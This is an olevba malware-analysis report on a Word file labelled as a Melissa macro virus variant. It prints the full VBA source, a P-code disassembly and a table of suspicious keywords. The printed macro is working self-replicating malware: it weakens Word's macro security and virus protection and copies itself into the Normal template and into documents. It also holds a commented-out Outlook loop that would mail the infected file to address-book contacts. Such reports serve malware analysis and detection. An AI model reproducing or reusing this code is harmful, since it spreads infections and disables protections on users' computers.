olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.s
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Melissa.cls 
in file: Virus.MSWord.Melissa.s - OLE stream: 'Macros/VBA/Melissa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = True
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
    CommandBars("Tools").Controls("Macro").Enabled = True
    Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If
Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
Set UngaDasOutlook = CreateObject("Outlook.Application")
Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") <> "... by Kwyjibo" Then
If UngaDasOutlook = "Outlook" Then
DasMapiName.Logon "profile", "password"
'    For y = 1 To DasMapiName.AddressLists.Count
'        Set AddyBook = DasMapiName.AddressLists(y)
'        x = 1
'        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
''        For oo = 1 To AddyBook.AddressEntries.Count
''            Peep = AddyBook.AddressEntries(x)
''            BreakUmOffASlice.Recipients.Add Peep
''            x = x + 1
''            If x > 50 Then oo = AddyBook.AddressEntries.Count
''         Next oo
''         BreakUmOffASlice.Subject = "Important Message From " & Application.UserName
' '        BreakUmOffASlice.Body = "Here is that document you asked for ... don't show anyone else ;-)"
'  '       BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
'  '       BreakUmOffASlice.Send
'   '      Peep = ""
'    Next y
'DasMapiName.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") = "... by Kwyjibo"
End If
Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = NTI1.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
BGN = 2
If ADI1.Name <> "Melissa" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = ADI1
ADI1.Name = "Melissa"
DoAD = True
End If
If NTI1.Name <> "Melissa" Then
If NTCL > 0 Then _
NTI1.CodeModule.DeleteLines 1, NTCL
Set ToInfect = NTI1
NTI1.Name = "Melissa"
DoNT = True
End If
If DoNT <> True And DoAD <> True Then GoTo CYA
If DoNT = True Then
Do While ADI1.CodeModule.Lines(1, 1) = ""
ADI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While ADI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, ADI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
If DoAD = True Then
Do While NTI1.CodeModule.Lines(1, 1) = ""
NTI1.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While NTI1.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, NTI1.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If
CYA:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
'WORD/Melissa written by Kwyjibo
'Works in both Word 2000 and Word 97
'Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!
'Word -> Email | Word 97 <--> Word 2000 ... it's a new age!
If Day(Now) = Minute(Now) Then Selection.TypeText " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here."
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Melissa.s
' ===============================================================================
' Module streams:
' Macros/VBA/Melissa - 6806 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #3:
' 	LitVarSpecial (True)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #4:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #5:
' 	ElseBlock 
' Line #6:
' 	LitVarSpecial (True)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #7:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #8:
' 	EndIfBlock 
' Line #9:
' 	Dim 
' 	VarDefn UngaDasOutlook
' 	VarDefn DasMapiName
' 	VarDefn BreakUmOffASlice
' Line #10:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set UngaDasOutlook 
' Line #11:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld UngaDasOutlook 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set DasMapiName 
' Line #12:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0008 "Melissa?"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x000E "... by Kwyjibo"
' 	Ne 
' 	IfBlock 
' Line #13:
' 	Ld UngaDasOutlook 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #14:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld DasMapiName 
' 	ArgsMemCall Logon 0x0002 
' Line #15:
' 	QuoteRem 0x0000 0x002F "    For y = 1 To DasMapiName.AddressLists.Count"
' Line #16:
' 	QuoteRem 0x0000 0x0032 "        Set AddyBook = DasMapiName.AddressLists(y)"
' Line #17:
' 	QuoteRem 0x0000 0x000D "        x = 1"
' Line #18:
' 	QuoteRem 0x0000 0x003B "        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)"
' Line #19:
' 	QuoteRem 0x0000 0x0034 "'        For oo = 1 To AddyBook.AddressEntries.Count"
' Line #20:
' 	QuoteRem 0x0000 0x002E "'            Peep = AddyBook.AddressEntries(x)"
' Line #21:
' 	QuoteRem 0x0000 0x0031 "'            BreakUmOffASlice.Recipients.Add Peep"
' Line #22:
' 	QuoteRem 0x0000 0x0016 "'            x = x + 1"
' Line #23:
' 	QuoteRem 0x0000 0x003E "'            If x > 50 Then oo = AddyBook.AddressEntries.Count"
' Line #24:
' 	QuoteRem 0x0000 0x0011 "'         Next oo"
' Line #25:
' 	QuoteRem 0x0000 0x0055 "'         BreakUmOffASlice.Subject = "Important Message From " & Application.UserName"
' Line #26:
' 	QuoteRem 0x0000 0x0066 " '        BreakUmOffASlice.Body = "Here is that document you asked for ... don't show anyone else ;-)""
' Line #27:
' 	QuoteRem 0x0000 0x0042 "  '       BreakUmOffASlice.Attachments.Add ActiveDocument.FullName"
' Line #28:
' 	QuoteRem 0x0000 0x001F "  '       BreakUmOffASlice.Send"
' Line #29:
' 	QuoteRem 0x0000 0x0013 "   '      Peep = """
' Line #30:
' 	QuoteRem 0x0000 0x000A "    Next y"
' Line #31:
' 	QuoteRem 0x0000 0x0012 "DasMapiName.Logoff"
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	LitStr 0x000E "... by Kwyjibo"
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0008 "Melissa?"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set ADI1 
' Line #36:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set NTI1 
' Line #37:
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St NTCL 
' Line #38:
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ADCL 
' Line #39:
' 	LitDI2 0x0002 
' 	St BGN 
' Line #40:
' 	Ld ADI1 
' 	MemLd New 
' 	LitStr 0x0007 "Melissa"
' 	Ne 
' 	IfBlock 
' Line #41:
' 	LineCont 0x0004 05 00 00 00
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld ADCL 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #42:
' 	SetStmt 
' 	Ld ADI1 
' 	Set ToInfect 
' Line #43:
' 	LitStr 0x0007 "Melissa"
' 	Ld ADI1 
' 	MemSt New 
' Line #44:
' 	LitVarSpecial (True)
' 	St DoAD 
' Line #45:
' 	EndIfBlock 
' Line #46:
' 	Ld NTI1 
' 	MemLd New 
' 	LitStr 0x0007 "Melissa"
' 	Ne 
' 	IfBlock 
' Line #47:
' 	LineCont 0x0004 05 00 00 00
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld NTCL 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #48:
' 	SetStmt 
' 	Ld NTI1 
' 	Set ToInfect 
' Line #49:
' 	LitStr 0x0007 "Melissa"
' 	Ld NTI1 
' 	MemSt New 
' Line #50:
' 	LitVarSpecial (True)
' 	St DoNT 
' Line #51:
' 	EndIfBlock 
' Line #52:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo CYA 
' 	EndIf 
' Line #53:
' 	Ld DoNT 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #54:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #55:
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #56:
' 	Loop 
' Line #57:
' 	LitStr 0x001C "Private Sub Document_Close()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #58:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #59:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld ADI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #60:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #61:
' 	Loop 
' Line #62:
' 	EndIfBlock 
' Line #63:
' 	Ld DoAD 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #64:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	DoWhile 
' Line #65:
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #66:
' 	Loop 
' Line #67:
' 	LitStr 0x001B "Private Sub Document_Open()"
' 	Paren 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #68:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0000 ""
' 	Ne 
' 	DoWhile 
' Line #69:
' 	Ld BGN 
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Ld NTI1 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Ld ToInfect 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #70:
' 	Ld BGN 
' 	LitDI2 0x0001 
' 	Add 
' 	St BGN 
' Line #71:
' 	Loop 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	Label CYA 
' Line #74:
' 	Ld NTCL 
' 	LitDI2 0x0000 
' 	Ne 
' 	Ld ADCL 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	IfBlock 
' Line #75:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #76:
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0008 "Document"
' 	FnInStr3 
' 	LitVarSpecial (False)
' 	Ne 
' 	Paren 
' 	ElseIfBlock 
' Line #77:
' 	LitVarSpecial (True)
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	BoS 0x0000 
' 	EndIfBlock 
' Line #78:
' 	QuoteRem 0x0000 0x001F "WORD/Melissa written by Kwyjibo"
' Line #79:
' 	QuoteRem 0x0000 0x0023 "Works in both Word 2000 and Word 97"
' Line #80:
' 	QuoteRem 0x0000 0x003E "Worm? Macro Virus? Word 97 Virus? Word 2000 Virus? You Decide!"
' Line #81:
' 	QuoteRem 0x0000 0x003A "Word -> Email | Word 97 <--> Word 2000 ... it's a new age!"
' Line #82:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0076 " Twenty-two points, plus triple-word-score, plus fifty points for using all my letters.  Game's over.  I'm outta here."
' 	Ld Selection 
' 	ArgsMemCall TypeText 0x0001 
' 	EndIf 
' Line #83:
' 	EndSub 
' Line #84:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

